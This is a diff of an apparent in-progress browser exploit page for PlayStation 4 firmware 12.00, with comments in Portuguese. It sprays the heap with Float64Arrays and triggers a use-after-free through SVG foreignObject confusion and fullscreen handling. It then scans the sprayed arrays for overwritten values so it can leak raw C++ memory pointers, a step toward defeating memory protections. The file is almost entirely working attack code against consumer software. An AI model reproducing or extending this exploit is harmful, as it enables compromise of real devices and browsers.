@@ -2,11 +2,11 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - OOB Read Memory Dumper V2</title>
+<title>PS4 12.00 - C++ Pointer Hunter</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF → OOB Read → Memory Dumper V2</h2>
+<h2>UAF → C++ Pointer Hunter</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
@@ -20,12 +20,12 @@ function log(msg){
 }
 
 // ==========================
-// HEAP SETUP ORIGINAL (100% INALTERADO)
+// 🌍 HEAP SETUP (SUA FUNÇÃO ORIGINAL - A NOSSA REDE DE CAPTURA)
 function setupHeap(){
     let arr=[];
     for(let i=0;i<5000;i++){
         let a=new Float64Array(8);
-        a[0]= 0x1337BEEF; 
+        a[0]=i; // Cada array começa com o seu próprio número de ID
         arr.push(a);
     }
     return arr;
@@ -61,12 +61,9 @@ function reclaim(size){
 }
 
 // ==========================
-// 💥 SVG CONFUSION (100% INALTERADO)
-// ==========================
-// 💥 SVG CONFUSION (MINIFICADO)
+// 💥 SVG CONFUSION (100% INALTERADO - Minificado)
 function inject(child){
     try{
-        // Linha única, sem espaços ou "enters" inúteis!
         child.outerHTML = `<svg><foreignObject width="100%" height="100%"><div xmlns="http://www.w3.org/1999/xhtml">AAAA</div></foreignObject></svg>`;
         log("[*] payload injected");
     }catch(e){
@@ -75,46 +72,32 @@ function inject(child){
 }
 
 // ==========================
-// 🔬 OOB READ PROBE V2 (SEM TRAVAS)
-function domOverlapProbe(fsTarget){
-    log("---- MEMORY DUMP PROBE ----");
+// 🔬 POINTER HUNTER (O SCANNER REAL)
+function domOverlapProbe(){
+    log("---- HUNTING FOR C++ POINTERS ----");
 
     try{
-        let n = fsTarget.firstChild;
-        if(!n) return;
+        // Nós ignoramos o DOM completamente e olhamos apenas para a memória do JS
+        if(!window.heap_press) return;
 
-        if(n.nodeType === 3){
-            log("[!!!] TEXTNODE CONFUSION (Lendo...)");
-
-            try{
-                let leakedData = n.data; 
+        for(let i=0; i<window.heap_press.length; i++){
+            
+            // O valor original era 'i'. Se o motor C++ tocou aqui por causa do UAF,
+            // esse valor vai ser substituído por um ponteiro de memória gigante!
+            if(window.heap_press[i][0] !== i){
                 
-                if(!leakedData){
-                    log("[SCAN] Vazamento vazio");
-                    return;
-                }
-
-                log("[LEAK] Tamanho do buffer vazado: " + leakedData.length + " bytes");
-
-                // 🔥 CORREÇÃO: Lê qualquer coisa maior que 0!
-                if(leakedData.length > 0){
-                    let hexDump = [];
-                    // Pega até 50 caracteres (se tiver)
-                    for(let i=0; i < Math.min(leakedData.length, 50); i++){
-                        hexDump.push(leakedData.charCodeAt(i).toString(16).padStart(4, '0'));
-                    }
-                    
-                    log("[DUMP] " + hexDump.join(" "));
-
-                    if(leakedData.includes("CONTROL")){
-                        log("[$$$] Lendo memória do RECLAIM (DOM Vizinho!)");
-                    }
-                }
-
-            }catch(e){
-                log("[UAF] read crash");
+                log("[$$$] JACKPOT! VAZAMENTO C++ DETECTADO!");
+                log("[$$$] O Array ID " + i + " foi sobrescrito pelo motor!");
+                
+                // Esse número decimal maluco É o endereço de memória real
+                log("[$$$] Ponteiro Cru (Float): " + window.heap_press[i][0]);
+                
+                return; // Paramos a busca
             }
         }
+        
+        log("[SCAN] Arrays intactos neste ciclo...");
+
     }catch(e){
         log("[UAF] probe crash");
     }
@@ -141,9 +124,10 @@ function trigger(fsTarget){
         }catch(e){}
     }, 30);
 
-    setTimeout(()=>domOverlapProbe(fsTarget), 80);
-    setTimeout(()=>domOverlapProbe(fsTarget), 180);
-    setTimeout(()=>domOverlapProbe(fsTarget), 280);
+    // O Probe agora não precisa mais do fsTarget, ele vasculha o heap global
+    setTimeout(()=>domOverlapProbe(), 80);
+    setTimeout(()=>domOverlapProbe(), 180);
+    setTimeout(()=>domOverlapProbe(), 280);
 
     setTimeout(()=>{ alert(logBuffer.join("\n")); }, 450);
     setTimeout(()=>location.reload(), 600);
@@ -152,8 +136,9 @@ function trigger(fsTarget){
 // ==========================
 // MAIN
 function runTest(){
-    log("[*] Iniciando teste (Memory Dump V2)...");
+    log("[*] Iniciando Pointer Hunter...");
     
+    // Cria a nossa "rede" de Float64Arrays
     window.heap_press = setupHeap(); 
 
     let fsTarget=setupFullscreen();
